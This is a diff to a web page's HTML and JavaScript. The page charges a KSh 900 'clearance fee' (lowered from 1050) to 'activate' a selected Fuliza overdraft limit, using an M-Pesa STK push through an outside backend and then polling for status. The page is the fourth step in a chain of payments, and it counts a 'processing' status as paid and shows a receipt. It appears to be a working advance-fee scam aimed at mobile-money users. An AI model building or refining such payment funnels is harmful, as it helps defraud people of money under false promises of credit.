@@ -124,7 +124,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
       <div class="invoice-limit">Selected Fuliza Limit: <span>KSh <span id="limit">—</span></span></div>  
       <div class="invoice-amount-row">  
         <div class="invoice-currency">KSh</div>  
-        <div class="invoice-amount">1050</div>  
+        <div class="invoice-amount">900</div>  
         <div class="invoice-label">Amount Due</div>  
       </div>  
     </div>  <div class="checklist">  
@@ -162,7 +162,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
 </div>  
 <div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>  
 
-<button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 1050 &amp; Activate Limit</button>  
+<button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 900 &amp; Activate Limit</button>  
 
 <div class="spinner" id="spinner">  
   <div class="loader"></div>  
@@ -215,79 +215,94 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
   </div>  
 </div>
  <script>
+/* =========================
+   CONFIGURATION
+========================= */
 const BACKEND = "https://optimapay-server.onrender.com";
+const CLEARANCE_FEE = 900;
 
-const selectedAmount = localStorage.getItem("selectedAmount") || "—";
-
-document.getElementById("limit").innerText = selectedAmount;
-document.getElementById("limitInNote").innerText = selectedAmount;
-
-const CLEARANCE_FEE = 1050;
-
+/* =========================
+   ELEMENT REFERENCES
+========================= */
 const phoneInput  = document.getElementById("phone");
 const phoneWrap   = document.getElementById("phoneWrap");
 const phoneStatus = document.getElementById("phoneStatus");
 const phoneHint   = document.getElementById("phoneHint");
+const payBtn      = document.getElementById("payBtn");
+const spinner     = document.getElementById("spinner");
+const spinnerText = document.getElementById("spinnerText");
+const statusMsg   = document.getElementById("statusMsg");
 
+let pollInterval = null;
+
+/* =========================
+   STEP PROTECTION
+========================= */
+if(!localStorage.getItem("payment3Completed")){
+  window.location.href = "payment3.html";
+}
+
+/* =========================
+   PHONE INPUT VALIDATION
+========================= */
 phoneInput.addEventListener("input", () => {
   phoneInput.value = phoneInput.value.replace(/\D/g,"").slice(0,9);
   validatePhoneUI(phoneInput.value);
 });
 
 function validatePhoneUI(val){
-
   if(val.length !== 9){
     phoneWrap.className="phone-wrap";
     phoneStatus.innerText="";
     return false;
   }
-
   if(!val.startsWith("7") && !val.startsWith("1")){
     phoneWrap.className="phone-wrap invalid";
     phoneStatus.innerText="✗";
     phoneStatus.style.color="#e74c3c";
     return false;
   }
-
   phoneWrap.className="phone-wrap valid";
   phoneStatus.innerText="✓";
   phoneStatus.style.color="#1fb141";
-
   return true;
 }
 
+/* =========================
+   UI HELPERS
+========================= */
 function showStatus(msg,type){
-  const el=document.getElementById("statusMsg");
-  el.innerText=msg;
-  el.className="status-msg "+type;
-  el.style.display="block";
+  statusMsg.innerText = msg;
+  statusMsg.className = "status-msg " + type;
+  statusMsg.style.display = "block";
 }
 
 function hideStatus(){
-  document.getElementById("statusMsg").style.display="none";
+  statusMsg.style.display = "none";
 }
 
 function setSpinner(show,text){
-  document.getElementById("spinner").style.display=show?"flex":"none";
-  if(text) document.getElementById("spinnerText").innerText=text;
+  spinner.style.display = show ? "flex" : "none";
+  if(text) spinnerText.innerText = text;
 }
 
 function setPayBtn(disabled){
-  document.getElementById("payBtn").disabled=disabled;
+  payBtn.disabled = disabled;
 }
 
-let pollInterval=null;
-
+/* =========================
+   PAY NOW
+========================= */
 async function payNow(){
 
-  const digits=phoneInput.value.trim();
+  const digits = phoneInput.value.trim();
 
   if(!validatePhoneUI(digits)){
     showStatus("Enter a valid Safaricom number.","error");
     return;
   }
 
-  const fullPhone="254"+digits;
+  const fullPhone = "254" + digits;
 
   hideStatus();
   setSpinner(true,"Sending STK Push...");
@@ -295,150 +310,154 @@ async function payNow(){
 
   let data;
 
-  try{
-
-    const res=await fetch(BACKEND+"/pay",{
-      method:"POST",
-      headers:{ "Content-Type":"application/json" },
-      body:JSON.stringify({
-        phone:fullPhone,
-        amount:CLEARANCE_FEE,
-        deposit_amount:selectedAmount
+  try {
+    const res = await fetch(`${BACKEND}/stk-push`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        phone: fullPhone,
+        amount: CLEARANCE_FEE
       })
     });
 
-    data=await res.json();
-
-  }catch(e){
-
+    data = await res.json();
+  } catch(e){
     setSpinner(false);
     setPayBtn(false);
     showStatus("Network error contacting server.","error");
     return;
-
   }
 
   if(!data.success){
-
     setSpinner(false);
     setPayBtn(false);
-    showStatus(data.message || "Payment failed.","error");
+    showStatus(data.message || "STK Push failed.","error");
     return;
-
   }
 
-  const reference=data.reference;
+  const checkoutId = data.checkout_request_id || data.CheckoutRequestID || data.data?.checkout_request_id;
 
-  setSpinner(true,"Check your phone and enter M-Pesa PIN");
-  showStatus("Waiting for confirmation...","info");
+  if(!checkoutId){
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus("STK Push could not be initiated.","error");
+    return;
+  }
 
-  startPolling(reference,fullPhone);
+  setSpinner(true,"STK sent ✓ Enter PIN on phone");
+  showStatus("Waiting for M-Pesa confirmation...","info");
+
+  startPolling(checkoutId, fullPhone);
 }
 
-function startPolling(reference,phone){
+/* =========================
+   POLLING FUNCTION
+========================= */
+function startPolling(checkoutId, phone){
 
-  let attempts=0;
-  const maxAttempts=40;
+  let attempts = 0;
+  const maxAttempts = 60;
 
   clearInterval(pollInterval);
 
-  pollInterval=setInterval(async()=>{
+  pollInterval = setInterval(async () => {
 
     attempts++;
 
-    if(attempts>maxAttempts){
-
+    if(attempts > maxAttempts){
       clearInterval(pollInterval);
-
       setSpinner(false);
       setPayBtn(false);
-
-      showFailurePopup("Your payment hasn't deducted from your account. Please try again.");
-
+      showFailurePopup("Payment confirmation timed out. Please try again.");
       return;
     }
 
     try{
+      const res = await fetch(`${BACKEND}/check-status`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ checkout_request_id: checkoutId })
+      });
 
-      const res=await fetch(`${BACKEND}/receipt/${reference}`);
-      const data=await res.json();
+      if(!res.ok) return;
 
-      if(!data.success) return;
+      const data = await res.json();
+      if(!data || !data.status) return;
 
-      const receipt=data.receipt;
+      const status = data.status.toLowerCase();
 
-      if(!receipt || receipt.status==="pending") return;
+      if(status === "pending"){
+        showStatus("Waiting for M-Pesa confirmation...","info");
+        return;
+      }
 
       clearInterval(pollInterval);
-
       setSpinner(false);
       setPayBtn(false);
 
-      if(receipt.status==="processing"){
-
-        showSuccessPopup(receipt,phone);
-
-      }else{
-
-        showFailurePopup("Payment cancelled.");
-
+      if(["completed","success","paid","processing"].includes(status)){
+        localStorage.setItem("payment4Completed","yes");
+        showSuccessPopup({
+          reference: data.transaction_code || checkoutId,
+          amount: CLEARANCE_FEE,
+          phone: phone,
+          timestamp: Date.now()
+        });
+        return;
       }
 
-    }catch(e){}
+      if(status === "failed"){
+        showFailurePopup(data.message || "Payment failed or cancelled.");
+        return;
+      }
 
-  },1500);
+      // fallback for unknown status
+      showFailurePopup("Payment status unknown. Try again.");
+
+    } catch(err){
+      console.log("Polling error:", err);
+    }
+
+  }, 3000);
+
 }
 
-function showSuccessPopup(receipt,fallbackPhone){
-
-  document.getElementById("rReceiptNo").innerText=
-  receipt.receiptNumber || "N/A";
-
-  document.getElementById("rAmount").innerText=
-  "KSh "+(receipt.amount || CLEARANCE_FEE);
-
-  document.getElementById("rPhone").innerText=
-  receipt.phone || fallbackPhone;
-
-  document.getElementById("rDate").innerText=
-  receipt.transactionDate || new Date().toLocaleString("en-KE");
-
-  document.getElementById("rNewLimit").innerText=selectedAmount;
+/* =========================
+   SUCCESS POPUP
+========================= */
+function showSuccessPopup(receipt){
+  document.getElementById("rReceiptNo").innerText = receipt.reference;
+  document.getElementById("rAmount").innerText = "KSh " + receipt.amount;
+  document.getElementById("rPhone").innerText = receipt.phone;
+  document.getElementById("rDate").innerText = new Date(receipt.timestamp).toLocaleString("en-KE");
 
   document.getElementById("successOverlay").classList.add("show");
-  setTimeout(()=>{
-  window.location.href = "success.html";
-  },8000);
-}
-
-function closeSuccess(){
-
-  document.getElementById("successOverlay").classList.remove("show");
 
   setTimeout(()=>{
     window.location.href = "success.html";
-  },300);
+  }, 8000);
+}
 
-     }
+function closeSuccess(){
+  document.getElementById("successOverlay").classList.remove("show");
+  setTimeout(()=>window.location.href="success.html",300);
+}
 
+/* =========================
+   FAILURE POPUP
+========================= */
 function showFailurePopup(reason){
-
-  document.getElementById("failureReason").innerText=reason;
-
+  document.getElementById("failureReason").innerText = reason;
   document.getElementById("failureOverlay").classList.add("show");
 }
 
 function retryPayment(){
-
   document.getElementById("failureOverlay").classList.remove("show");
-
   clearInterval(pollInterval);
-
   hideStatus();
   setSpinner(false);
   setPayBtn(false);
-
 }
-</script>  
+    </script>  
 </body>  
-          </html>
+</html>
